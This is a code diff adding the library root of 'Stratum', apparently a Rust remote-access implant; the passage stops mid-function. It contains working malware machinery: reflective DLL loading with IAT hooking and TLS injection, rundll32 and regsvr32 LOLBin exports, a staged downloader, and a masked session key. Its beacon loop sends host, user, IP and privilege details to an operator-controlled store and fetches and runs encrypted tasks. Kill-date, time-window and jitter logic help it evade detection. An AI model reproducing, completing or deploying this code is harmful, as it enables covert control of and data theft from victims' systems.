@@ -1,0 +1,784 @@
+//! Stratum native Rust agent — library crate root.
+//!
+//! Three compile-time modes (set by build.rs via STRATUM_DEPLOY_MODE):
+//!   stratum_staged_enc    → staged stub: stub_secret baked, download encrypted stage2, decrypt, exec
+//!   stratum_stageless_enc → full agent, C2 config encrypted with stub_secret baked in stub
+//!   (neither)             → stageless-plain: fully self-contained agent (original behaviour)
+
+pub mod crypto;
+pub mod crypto_compat;
+pub mod exec;
+pub mod hw;
+pub mod loader;
+pub mod obfs;
+pub mod persist;
+pub mod protocol;
+pub mod sysinfo;
+pub mod transport;
+
+#[cfg(stratum_staged_enc)]
+pub mod staged;
+
+#[cfg(stratum_stageless_enc)]
+pub mod stageless_enc;
+
+use std::sync::Arc;
+use std::time::Duration;
+use chrono::{Datelike, Timelike};
+
+// ── compile-time constants ────────────────────────────────────────────────────
+
+const WINDOW_START:  &str = env!("STRATUM_WINDOW_START");
+const WINDOW_END:    &str = env!("STRATUM_WINDOW_END");
+const KILL_DATE:     &str = env!("STRATUM_KILL_DATE");
+#[cfg(not(windows))] const BLOB_PATH: &str = env!("STRATUM_BLOB_PATH_LINUX");
+#[cfg(windows)]      const BLOB_PATH: &str = env!("STRATUM_BLOB_PATH_WIN");
+
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const FOLDER_PATH:    &str = env!("STRATUM_FOLDER_PATH");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const INPUT_FILE:     &str = env!("STRATUM_INPUT_FILE");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const OUTPUT_FILE:    &str = env!("STRATUM_OUTPUT_FILE");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const HEARTBEAT_FILE: &str = env!("STRATUM_HEARTBEAT_FILE");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const BASE_SLEEP_S:   &str = env!("STRATUM_BASE_SLEEP");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const JITTER_PCT_S:   &str = env!("STRATUM_JITTER");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const PUB_KEY_B64:    &str = env!("STRATUM_PUBLIC_KEY_B64");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const STUN_IP:        &str = env!("STRATUM_STUN_IP");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const SESSION_KEY_XOR: &str = env!("STRATUM_SESSION_KEY_XOR");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const SESSION_KEY_MASK: &str = env!("STRATUM_XOR_MASK");
+
+// ── DLL entry + LOLBin exports (Windows only) ────────────────────────────────
+
+#[cfg(windows)]
+static AGENT_START: std::sync::Once = std::sync::Once::new();
+
+#[cfg(windows)]
+#[no_mangle]
+pub static AGENT_THREAD_HANDLE: std::sync::atomic::AtomicUsize =
+    std::sync::atomic::AtomicUsize::new(0);
+
+// TLS info for the reflective-load path: set by StratumRun, read by StratumCreateThread.
+// Stores the three values needed to inject a TLS block into any new thread's TEB.
+#[cfg(windows)]
+static TLS_ADDR_OF_INDEX: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+#[cfg(windows)]
+static TLS_TEMPLATE_VA:   std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+#[cfg(windows)]
+static TLS_TEMPLATE_SZ:   std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+
+// Trampoline: each spawned thread runs this first to init its own TLS,
+// then calls the real entry point. Passed via heap-allocated TrampolineArgs.
+#[cfg(windows)]
+struct TrampolineArgs {
+    real_func:  unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+    real_param: *mut std::ffi::c_void,
+}
+#[cfg(windows)]
+unsafe impl Send for TrampolineArgs {}
+
+#[cfg(windows)]
+unsafe extern "system" fn tls_trampoline(param: *mut std::ffi::c_void) -> u32 {
+    extern "system" { fn OutputDebugStringA(s: *const u8); }
+    OutputDebugStringA(b"[CT] trampoline entered\0".as_ptr());
+
+    // Recover args from heap-allocated box, drop it after reading.
+    let args = Box::from_raw(param as *mut TrampolineArgs);
+    let real_func  = args.real_func;
+    let real_param = args.real_param;
+    drop(args);
+
+    // Init TLS for this thread — identical to agent_thread_entry logic.
+    use std::sync::atomic::Ordering::SeqCst;
+    let addr_of_index = TLS_ADDR_OF_INDEX.load(SeqCst) as *const u32;
+    let _template_va  = TLS_TEMPLATE_VA.load(SeqCst)   as *const u8; // not used — zero-init only
+    let template_sz   = TLS_TEMPLATE_SZ.load(SeqCst);
+
+    if !addr_of_index.is_null() && template_sz > 0 {
+        let tls_slot = *addr_of_index as usize;
+        // Log slot and template_sz for diagnostics
+        {
+            let mut msg = *b"[CT] trampoline slot=???? sz=????????\0";
+            let s = tls_slot;
+            msg[20] = b'0' + ((s / 1000) % 10) as u8;
+            msg[21] = b'0' + ((s / 100)  % 10) as u8;
+            msg[22] = b'0' + ((s / 10)   % 10) as u8;
+            msg[23] = b'0' + (s           % 10) as u8;
+            let z = template_sz;
+            msg[28] = b'0' + ((z / 10000000) % 10) as u8;
+            msg[29] = b'0' + ((z / 1000000)  % 10) as u8;
+            msg[30] = b'0' + ((z / 100000)   % 10) as u8;
+            msg[31] = b'0' + ((z / 10000)    % 10) as u8;
+            msg[32] = b'0' + ((z / 1000)     % 10) as u8;
+            msg[33] = b'0' + ((z / 100)      % 10) as u8;
+            msg[34] = b'0' + ((z / 10)       % 10) as u8;
+            msg[35] = b'0' + (z               % 10) as u8;
+            OutputDebugStringA(msg.as_ptr());
+        }
+        // Safety check: slot must be valid (< 1088 = Win32 TLS limit) and non-zero
+        if tls_slot == 0 || tls_slot >= 1088 {
+            let mut msg = *b"[CT] trampoline bad slot=????\0";
+            let s = tls_slot;
+            msg[24] = b'0' + ((s / 1000) % 10) as u8;
+            msg[25] = b'0' + ((s / 100)  % 10) as u8;
+            msg[26] = b'0' + ((s / 10)   % 10) as u8;
+            msg[27] = b'0' + (s           % 10) as u8;
+            OutputDebugStringA(msg.as_ptr());
+        } else {
+            // Use HeapAlloc directly — bypasses the Rust allocator runtime entirely.
+            // std::alloc in a newly-created thread (before TLS is set up) can corrupt
+            // heap metadata because the Rust allocator may touch thread-local state.
+            extern "system" {
+                fn HeapAlloc(heap: *mut core::ffi::c_void, flags: u32, bytes: usize) -> *mut core::ffi::c_void;
+                fn GetProcessHeap() -> *mut core::ffi::c_void;
+            }
+            let tls_block = HeapAlloc(GetProcessHeap(), 0x08 /* HEAP_ZERO_MEMORY */, template_sz)
+                as *mut u8;
+        if !tls_block.is_null() {
+            // Block is already zeroed by HEAP_ZERO_MEMORY.
+            // Rust thread_local! vars initialise lazily from a zero block.
+            // Write into current thread's ThreadLocalStoragePointer array (gs:[0x58]).
+            let tls_array: usize;
+            core::arch::asm!("mov {}, gs:[0x58]", out(reg) tls_array, options(nostack, pure, nomem));
+            if tls_array != 0 {
+                let slot_ptr = (tls_array + tls_slot * 8) as *mut usize;
+                *slot_ptr = tls_block as usize;
+                OutputDebugStringA(b"[CT] trampoline TLS ok\0".as_ptr());
+            } else {
+                OutputDebugStringA(b"[CT] trampoline tlsp still null\0".as_ptr());
+            }
+        }
+        }
+    }
+
+    OutputDebugStringA(b"[CT] trampoline calling real_func\0".as_ptr());
+    let ret = real_func(real_param);
+    OutputDebugStringA(b"[CT] trampoline real_func returned\0".as_ptr());
+    ret
+}
+
+// StratumCreateThread — IAT-patched replacement for CreateThread in the reflective DLL.
+// The shellcode loader replaces the CreateThread entry in the DLL's IAT with this
+// function so that every thread spawned by reqwest/tokio/std gets a valid TLS block
+// before its first instruction runs (Windows skips DLL_THREAD_ATTACH for reflective DLLs).
+#[cfg(windows)]
+#[no_mangle]
+pub unsafe extern "system" fn StratumCreateThread(
+    attrs:  *mut std::ffi::c_void,
+    stack:  usize,
+    func:   unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+    param:  *mut std::ffi::c_void,
+    flags:  u32,
+    tid_out: *mut u32,
+) -> *mut std::ffi::c_void {
+    extern "system" {
+        fn GetModuleHandleA(name: *const u8) -> *mut std::ffi::c_void;
+        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *const std::ffi::c_void;
+        fn OutputDebugStringA(s: *const u8);
+    }
+    OutputDebugStringA(b"[CT] StratumCreateThread called\0".as_ptr());
+
+    // Resolve the REAL CreateThread directly from kernel32 — NOT via our IAT
+    // (which is now patched to point here, causing infinite recursion otherwise).
+    type FnCreateThread = unsafe extern "system" fn(
+        *mut std::ffi::c_void, usize,
+        unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+        *mut std::ffi::c_void, u32, *mut u32,
+    ) -> *mut std::ffi::c_void;
+    let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
+    if k32.is_null() {
+        OutputDebugStringA(b"[CT] k32 null\0".as_ptr());
+        return std::ptr::null_mut();
+    }
+    let p_ct = GetProcAddress(k32, b"CreateThread\0".as_ptr());
+    if p_ct.is_null() {
+        OutputDebugStringA(b"[CT] CreateThread not found\0".as_ptr());
+        return std::ptr::null_mut();
+    }
+    let real_create_thread: FnCreateThread = std::mem::transmute(p_ct);
+
+    // Wrap the caller's entry point in tls_trampoline so TLS is initialised
+    // as the very first thing the new thread does — before any Rust code runs.
+    // The trampoline runs AFTER ntdll's LdrInitializeThunk has set up
+    // ThreadLocalStoragePointer, so gs:[0x58] is valid when it fires.
+    let args = Box::new(TrampolineArgs { real_func: func, real_param: param });
+    let args_ptr = Box::into_raw(args) as *mut std::ffi::c_void;
+
+    let hthread = real_create_thread(
+        attrs, stack,
+        tls_trampoline,
+        args_ptr,
+        flags,   // pass flags as-is — no forced SUSPENDED needed
+        tid_out,
+    );
+    if hthread.is_null() {
+        // CreateThread failed — free the args to avoid a leak.
+        drop(Box::from_raw(args_ptr as *mut TrampolineArgs));
+        OutputDebugStringA(b"[CT] CreateThread returned null\0".as_ptr());
+    } else {
+        OutputDebugStringA(b"[CT] thread started\0".as_ptr());
+    }
+    hthread
+}
+
+// DllMain — called by _DllMainCRTStartup when loaded normally (rundll32/regsvr32).
+// NOT called by the reflective loader path (StratumRun bypasses OEP entirely).
+#[cfg(windows)]
+#[no_mangle]
+pub unsafe extern "system" fn DllMain(
+    _module: *mut std::ffi::c_void,
+    reason:  u32,
+    _res:    *mut std::ffi::c_void,
+) -> i32 {
+    if reason == 1 {
+        AGENT_START.call_once(|| {
+            let handle = std::thread::spawn(agent_loop);
+            use std::os::windows::io::IntoRawHandle;
+            let raw = handle.into_raw_handle();
+            AGENT_THREAD_HANDLE.store(raw as usize, std::sync::atomic::Ordering::SeqCst);
+        });
+    }
+    1
+}
+
+// rundll32.exe <dll>,Run
+#[cfg(windows)]
+#[no_mangle]
+pub unsafe extern "system" fn Run(
+    _hwnd: *mut std::ffi::c_void, _hinst: *mut std::ffi::c_void,
+    _cmd:  *const u8,             _show:  i32,
+) {
+    loop { std::thread::sleep(std::time::Duration::from_secs(3600)); }
+}
+
+// StratumCrtInit — called by the reflective loader BEFORE StratumRun.
+// Walks the .CRT$XI* and .CRT$XC* initialiser tables that lld-link merges
+// into .rdata, bounded by the __xi_a/__xi_z and __xc_a/__xc_z sentinels.
+#[cfg(windows)]
+#[no_mangle]
+pub unsafe extern "system" fn StratumCrtInit() {
+    extern "C" {
+        static __xi_a: unsafe extern "C" fn();
+        static __xi_z: unsafe extern "C" fn();
+        static __xc_a: unsafe extern "C" fn();
+        static __xc_z: unsafe extern "C" fn();
+    }
+    extern "system" { fn OutputDebugStringA(s: *const u8); }
+    OutputDebugStringA(b"[CI] StratumCrtInit entered\0".as_ptr());
+
+    let mut p = &__xi_a as *const _ as *const usize;
+    let end   = &__xi_z as *const _ as *const usize;
+    while p < end {
+        let fp = *p;
+        if fp != 0 { let f: unsafe extern "C" fn() = core::mem::transmute(fp); f(); }
+        p = p.add(1);
+    }
+    OutputDebugStringA(b"[CI] XI inits done\0".as_ptr());
+
+    let mut p = &__xc_a as *const _ as *const usize;
+    let end   = &__xc_z as *const _ as *const usize;
+    while p < end {
+        let fp = *p;
+        if fp != 0 { let f: unsafe extern "C" fn() = core::mem::transmute(fp); f(); }
+        p = p.add(1);
+    }
+    OutputDebugStringA(b"[CI] XC inits done\0".as_ptr());
+}
+
+#[cfg(windows)]
+#[no_mangle]
+pub unsafe extern "system" fn StratumRun(
+    tls_info_block: *mut std::ffi::c_void,
+) -> u32 {
+    extern "system" {
+        fn CreateThread(
+            attrs: *mut std::ffi::c_void,
+            stack: usize,
+            func:  unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+            param: *mut std::ffi::c_void,
+            flags: u32,
+            tid:   *mut u32,
+        ) -> *mut std::ffi::c_void;
+        fn Sleep(ms: u32);
+        fn OutputDebugStringA(s: *const u8);
+    }
+
+    OutputDebugStringA(b"[SR] entered\0".as_ptr());
+
+    // Publish TLS info for StratumCreateThread so it can inject TLS into every
+    // new thread spawned by reqwest/tokio/std (they all go through our IAT hook).
+    {
+        use std::sync::atomic::Ordering::SeqCst;
+        let blk = tls_info_block as *const usize;
+        if !blk.is_null() {
+            let aoi = *blk.add(0);  // addr_of_index
+            let tva = *blk.add(1);  // tls_template_va
+            let tsz = *blk.add(2);  // tls_template_sz
+            TLS_ADDR_OF_INDEX.store(aoi, SeqCst);
+            TLS_TEMPLATE_VA.store(tva, SeqCst);
+            TLS_TEMPLATE_SZ.store(tsz, SeqCst);
+            OutputDebugStringA(b"[SR] TLS info published\0".as_ptr());
+        } else {
+            OutputDebugStringA(b"[SR] no TLS info block\0".as_ptr());
+        }
+    }
+
+    unsafe extern "system" fn agent_thread_entry(param: *mut std::ffi::c_void) -> u32 {
+        extern "system" { fn OutputDebugStringA(s: *const u8); }
+        OutputDebugStringA(b"[SR] agent_thread_entry started\0".as_ptr());
+
+        // Initialise per-thread TLS storage before any Rust thread-local access.
+        // Windows does not call DLL_THREAD_ATTACH for reflectively loaded DLLs.
+        // Without this, TEB.TlsSlots[tls_index] is NULL and any thread_local!
+        // access triggers __fastfail (ACCESS_VIOLATION bypassing panic hook).
+        //
+        // param = tls_info_block[3]:
+        //   [0] addr_of_index   — VA of DWORD holding the TLS slot index
+        //   [1] tls_template_va — VA of start of TLS template data
+        //   [2] tls_template_sz — size in bytes of TLS template
+        let blk = param as *const usize;
+        if !blk.is_null() {
+            extern "system" {
+                fn HeapAlloc(heap: *mut std::ffi::c_void, flags: u32, bytes: usize) -> *mut std::ffi::c_void;
+                fn GetProcessHeap() -> *mut std::ffi::c_void;
+            }
+            let addr_of_index    = *blk.add(0) as *const u32;
+            let _tls_template_va = *blk.add(1) as *const u8; // not used — zero-init only
+            let tls_template_sz  = *blk.add(2);
+            OutputDebugStringA(b"[SR] TLS: addr_of_index ok\0".as_ptr());
+            if !addr_of_index.is_null() && tls_template_sz > 0 {
+                let tls_slot = *addr_of_index as usize;
+                // log the slot index
+                extern "system" { fn OutputDebugStringA(s: *const u8); }
+                // simple slot number log via stack buffer
+                {
+                    let mut buf = [0u8; 32];
+                    buf[0] = b'['; buf[1] = b'S'; buf[2] = b'R'; buf[3] = b']';
+                    buf[4] = b' '; buf[5] = b'T'; buf[6] = b'L'; buf[7] = b'S';
+                    buf[8] = b' '; buf[9] = b's'; buf[10] = b'l'; buf[11] = b'o';
+                    buf[12] = b't'; buf[13] = b'=';
+                    let slot_str = if tls_slot < 10 {
+                        buf[14] = b'0' + tls_slot as u8; buf[15] = 0; 16
+                    } else {
+                        buf[14] = b'0' + (tls_slot / 10) as u8;
+                        buf[15] = b'0' + (tls_slot % 10) as u8;
+                        buf[16] = 0; 17
+                    };
+                    let _ = slot_str;
+                    OutputDebugStringA(buf.as_ptr());
+                }
+                let heap = GetProcessHeap();
+                let tls_block = HeapAlloc(heap, 0x08 /* HEAP_ZERO_MEMORY */, tls_template_sz);
+                if !tls_block.is_null() {
+                    OutputDebugStringA(b"[SR] TLS: HeapAlloc ok (zero, no template copy)\0".as_ptr());
+                    // Do NOT copy the template — leave the block zeroed.
+                    // Rust thread_local! vars initialise lazily from a zero block.
+                    if tls_slot < 64 {
+                        let tls_slots_base: usize;
+                        core::arch::asm!(
+                            "mov {}, gs:[0x58]",
+                            out(reg) tls_slots_base,
+                            options(nostack, pure, nomem)
+                        );
+                        OutputDebugStringA(b"[SR] TLS: writing standard slot\0".as_ptr());
+                        *((tls_slots_base + tls_slot * 8) as *mut usize) = tls_block as usize;
+                        OutputDebugStringA(b"[SR] TLS: standard slot written\0".as_ptr());
+                    } else {
+                        let exp_slots_base: usize;
+                        core::arch::asm!(
+                            "mov {}, gs:[0x1480]",
+                            out(reg) exp_slots_base,
+                            options(nostack, pure, nomem)
+                        );
+                        if exp_slots_base != 0 {
+                            OutputDebugStringA(b"[SR] TLS: writing expansion slot\0".as_ptr());
+                            *((exp_slots_base + (tls_slot - 64) * 8) as *mut usize) = tls_block as usize;
+                            OutputDebugStringA(b"[SR] TLS: expansion slot written\0".as_ptr());
+                        } else {
+                            OutputDebugStringA(b"[SR] TLS: expansion slots ptr is null!\0".as_ptr());
+                        }
+                    }
+                } else {
+                    OutputDebugStringA(b"[SR] TLS: HeapAlloc FAILED\0".as_ptr());
+                }
+            } else {
+                OutputDebugStringA(b"[SR] TLS: addr_of_index null or sz=0\0".as_ptr());
+            }
+        } else {
+            OutputDebugStringA(b"[SR] TLS: no info block (skipped)\0".as_ptr());
+        }
+        OutputDebugStringA(b"[SR] TLS init done, calling agent_loop\0".as_ptr());
+
+        agent_loop();
+        OutputDebugStringA(b"[SR] agent_loop returned\0".as_ptr());
+        0
+    }
+
+    OutputDebugStringA(b"[SR] spawning agent thread\0".as_ptr());
+    let h = CreateThread(
+        std::ptr::null_mut(), 0,
+        agent_thread_entry, tls_info_block,
+        0, std::ptr::null_mut(),
+    );
+    OutputDebugStringA(b"[SR] agent thread spawned\0".as_ptr());
+    AGENT_THREAD_HANDLE.store(h as usize, std::sync::atomic::Ordering::SeqCst);
+
+    let mut tick: u32 = 0;
+    loop {
+        Sleep(60_000);
+        tick += 1;
+        // Log every minute so we know StratumRun loop is still alive
+        if tick == 1 { OutputDebugStringA(b"[SR] loop tick 1m\0".as_ptr()); }
+        else if tick == 2 { OutputDebugStringA(b"[SR] loop tick 2m\0".as_ptr()); }
+        else if tick == 5 { OutputDebugStringA(b"[SR] loop tick 5m\0".as_ptr()); }
+    }
+}
+
+// regsvr32 /s <dll>
+#[cfg(windows)]
+#[no_mangle]
+pub extern "system" fn DllRegisterServer() -> i32 {
+    loop { std::thread::sleep(std::time::Duration::from_secs(3600)); }
+}
+
+// ── main entry point ──────────────────────────────────────────────────────────
+
+pub fn agent_loop() {
+    #[cfg(windows)]
+    unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] agent_loop entered\0".as_ptr()); }
+
+    #[cfg(stratum_staged_enc)]
+    {
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] mode: staged-enc\0".as_ptr()); }
+        staged::run();
+        return;
+    }
+
+    #[cfg(stratum_stageless_enc)]
+    { stageless_enc::run(); return; }
+
+    #[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+    {
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] mode: stageless-plain\0".as_ptr()); }
+
+        let base_sleep: u64 = BASE_SLEEP_S.parse().unwrap_or(60);
+        let jitter_pct: u64 = JITTER_PCT_S.parse().unwrap_or(20);
+
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] decode_pem\0".as_ptr()); }
+        let pem = match decode_pem(PUB_KEY_B64) {
+            Some(p) => p,
+            None    => return,
+        };
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] load_public_key\0".as_ptr()); }
+        let pub_key = match crypto::load_public_key(&pem) {
+            Ok(k)  => k,
+            Err(_) => return,
+        };
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] session_key\0".as_ptr()); }
+        let session_key: [u8; 32] = {
+            let xored = hex::decode(SESSION_KEY_XOR).unwrap_or_default();
+            let mask  = hex::decode(SESSION_KEY_MASK).unwrap_or_default();
+            if xored.len() != 32 || mask.len() != 32 { return; }
+            let mut k = [0u8; 32];
+            for i in 0..32 { k[i] = xored[i] ^ mask[i]; }
+            k
+        };
+
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] new_transport\0".as_ptr()); }
+        let transport = transport::new_transport();
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] new_transport done\0".as_ptr()); }
+        let state = exec::AgentState::new(
+            base_sleep, jitter_pct, FOLDER_PATH, BLOB_PATH, INPUT_FILE, OUTPUT_FILE,
+        );
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] AgentInfo\0".as_ptr()); }
+        let info = sysinfo::AgentInfo::collect(STUN_IP);
+        let start_cwd = std::env::current_dir()
+            .map(|p| p.display().to_string())
+            .unwrap_or_default();
+        #[cfg(windows)]
+        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] run_loop\0".as_ptr()); }
+        run_loop(
+            &info, &start_cwd, &pub_key, &session_key, &transport, &state,
+            FOLDER_PATH, INPUT_FILE, OUTPUT_FILE, HEARTBEAT_FILE,
+            BLOB_PATH, WINDOW_START, WINDOW_END,
+        );
+    }
+}
+
+// ── main loop ─────────────────────────────────────────────────────────────────
+
+pub(crate) fn run_loop(
+    info:        &sysinfo::AgentInfo,
+    start_cwd:   &str,
+    pub_key:     &crypto::PubKey,
+    session_key: &[u8; 32],
+    transport:   &transport::SharedTransport,
+    state:       &Arc<exec::AgentState>,
+    folder:      &str,
+    input_f:     &str,
+    output_f:    &str,
+    hb_f:        &str,
+    blob:        &str,
+    win_start:   &str,
+    win_end:     &str,
+) {
+    #[cfg(all(windows, stratum_debug))]
+    macro_rules! rl_log {
+        ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!("[RL] ", $s, "\0").as_ptr()); } }
+    }
+    #[cfg(all(not(windows), stratum_debug))]
+    macro_rules! rl_log { ($s:literal) => { eprintln!("[RL] {}", $s); } }
+    #[cfg(not(stratum_debug))]
+    macro_rules! rl_log { ($s:literal) => {}; }
+
+    rl_log!("loop start");
+    loop {
+        rl_log!("cycle top");
+        if !KILL_DATE.is_empty() && kill_date_expired(KILL_DATE) {
+            if cfg!(stratum_debug) { eprintln!("[agent] kill date reached — cleaning up"); }
+            exec::kill_cleanup_self(state, transport);
+            break;
+        }
+
+        if !in_window(win_start, win_end) {
+            if cfg!(stratum_debug) { eprintln!("[agent] outside time window, sleeping"); }
+            std::thread::sleep(Duration::from_secs(60));
+            continue;
+        }
+
+        rl_log!("building heartbeat");
+        let op_cwd = state.operator_cwd.lock().unwrap().clone();
+        let hb_seq = state.hb_seq.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
+        let heartbeat = build_heartbeat(info, start_cwd, &op_cwd, blob, hb_seq);
+        rl_log!("encrypting heartbeat");
+        if let Some(enc) = crypto::encrypt_heartbeat(&heartbeat, pub_key) {
+            rl_log!("uploading heartbeat");
+            transport.upload(&format!("{}{}", folder, hb_f), enc.as_bytes());
+            rl_log!("heartbeat uploaded");
+        } else {
+            rl_log!("heartbeat encrypt failed");
+        }
+
+        rl_log!("downloading input");
+        let input_path = format!("{}{}", folder, input_f);
+        #[cfg(windows)]
+        unsafe {
+            extern "system" { fn OutputDebugStringA(s: *const u8); }
+            let msg = format!("[RL] input_path={}\0", input_path);
+            OutputDebugStringA(msg.as_ptr());
+        }
+        let raw = match transport.download(&input_path) {
+            Some(b) => b,
+            None    => { rl_log!("download=None, jitter_sleep"); jitter_sleep(state); rl_log!("jitter_sleep done"); continue; }
+        };
+        #[cfg(windows)]
+        unsafe {
+            extern "system" { fn OutputDebugStringA(s: *const u8); }
+            let msg = format!("[RL] raw_len={}\0", raw.len());
+            OutputDebugStringA(msg.as_ptr());
+        }
+        rl_log!("download ok");
+
+        if raw == b"MZ" || raw.is_empty() { rl_log!("raw=MZ/empty, jitter_sleep"); jitter_sleep(state); rl_log!("jitter_sleep done"); continue; }
+
+        rl_log!("parsing raw");
+        let raw_str = match std::str::from_utf8(&raw) {
+            Ok(s)  => s.trim().to_string(),
+            Err(_) => { rl_log!("utf8 err, jitter_sleep"); jitter_sleep(state); rl_log!("jitter_sleep done"); continue; }
+        };
+
+        #[cfg(windows)]
+        unsafe {
+            extern "system" { fn OutputDebugStringA(s: *const u8); }
+            let preview = raw_str.get(..20.min(raw_str.len())).unwrap_or("");
+            let colon_count = raw_str.chars().filter(|&c| c == ':').count();
+            let msg = format!("[RL] raw_str[:20]={:?} colons={}\0", preview, colon_count);
+            OutputDebugStringA(msg.as_ptr());
+        }
+        rl_log!("decrypting command");
+        let task = match crypto::decrypt_command(&raw_str, pub_key, session_key) {
+            Some(t) => t,
+            None => {
+                rl_log!("decrypt failed KEY_MISMATCH");
+                let km = format!("KM:{}", unix_now());
+                if let Some(enc) = crypto::encrypt_heartbeat(&km, pub_key) {
+                    transport.upload(&format!("{}{}", folder, hb_f), enc.as_bytes());
+                }
+                jitter_sleep(state);
+                continue;
+            }
+        };
+
+        rl_log!("task decrypted");
+        if let Some(exp) = task.expires_at {
+            if unix_now() as f64 > exp {
+                rl_log!("task expired");
+                transport.upload(&input_path, b"MZ");
+                jitter_sleep(state);
+                continue;
+            }
+        }
+
+        #[cfg(windows)]
+        unsafe {
+            extern "system" { fn OutputDebugStringA(s: *const u8); }
+            let msg = format!("[RL] task.kind={} task.id={}\0", task.kind, task.id);
+            OutputDebugStringA(msg.as_ptr());
+        }
+        rl_log!("dispatching task");
+        match exec::dispatch(&task, state, transport) {
+            Some(resp) => {
+                rl_log!("dispatch ok, encrypting response");
+                match crypto::encrypt_response(&resp, pub_key) {
+                    Some(enc) => {
+                        rl_log!("encrypt ok, uploading response");
+                        let up = transport.upload(&format!("{}{}", folder, output_f), enc.as_bytes());
+                        #[cfg(windows)]
+                        unsafe {
+                            extern "system" { fn OutputDebugStringA(s: *const u8); }
+                            let msg = format!("[RL] output upload={}\0", up);
+                            OutputDebugStringA(msg.as_ptr());
+                        }
+                    }
+                    None => { rl_log!("encrypt_response returned None"); }
+                }
+                transport.upload(&input_path, b"MZ");
+                rl_log!("response uploaded");
+            }
+            None => {
+                rl_log!("dispatch returned None (exit/kill)");
+                transport.upload(&input_path, b"MZ");
+                break;
+            }
+        }
+
+        rl_log!("jitter_sleep post-dispatch");
+        jitter_sleep(state);
+        rl_log!("jitter_sleep done");
+    }
+    rl_log!("loop exited");
+}
+
+// ── helpers ───────────────────────────────────────────────────────────────────
+
+fn build_heartbeat(
+    info:      &sysinfo::AgentInfo,
+    start_cwd: &str,
+    op_cwd:    &str,
+    blob:      &str,
+    seq:       u64,
+) -> String {
+    #[cfg(windows)]
+    macro_rules! bh_log {
+        ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!("[BH] ", $s, "\0").as_ptr()); } }
+    }
+    #[cfg(not(windows))]
+    macro_rules! bh_log { ($s:literal) => {} }
+
+    bh_log!("hw::expand");
+    let expanded   = hw::expand(blob);
+    bh_log!("to_string_lossy");
+    let expanded_s = expanded.to_string_lossy();
+    bh_log!("blob_field");
+    let blob_field = if expanded.exists() { expanded_s.as_ref() } else { "" };
+    bh_log!("format");
+    let san = |s: &str| s.replace('|', "_");
+    let r = format!(
+        "{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}",
+        unix_now(),
+        san(&info.hostname), san(&info.username), san(&info.ip_int), san(&info.os),
+        san(&info.privs), san(start_cwd), san(op_cwd), san(&info.ip_ext),
+        info.pid, san(&info.process), san(&info.domain),
+        san(blob_field),
+        san(&expanded_s),
+        seq,
+    );
+    bh_log!("done");
+    r
+}
+
+pub fn unix_now() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0)
+}
+
+pub(crate) fn jitter_sleep(state: &Arc<exec::AgentState>) {
+    #[cfg(all(windows, stratum_debug))]
+    macro_rules! js_log {
+        ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!("[JS] ", $s, "\0").as_ptr()); } }
+    }
+    #[cfg(all(not(windows), stratum_debug))]
+    macro_rules! js_log { ($s:literal) => { eprintln!("[JS] {}", $s); } }
+    #[cfg(not(stratum_debug))]
+    macro_rules! js_log { ($s:literal) => {}; }
+
+    js_log!("enter");
+    use std::sync::atomic::Ordering;
+    use rand_distr::{Distribution, LogNormal};
+    js_log!("loading base");
+    let base   = state.base_sleep.load(Ordering::Relaxed) as f64;
+    let jitter = state.jitter_pct.load(Ordering::Relaxed) as f64;
+    js_log!("computing sleep");
+    let secs = if jitter > 0.0 {
+        let sigma  = (jitter / 100.0).max(0.01);
+        let mu     = base.ln() - sigma * sigma / 2.0;
+        js_log!("LogNormal::new");
+        let ln     = LogNormal::new(mu, sigma).unwrap_or_else(|_| {
+            LogNormal::new(base.ln(), 0.1).unwrap()
+        });
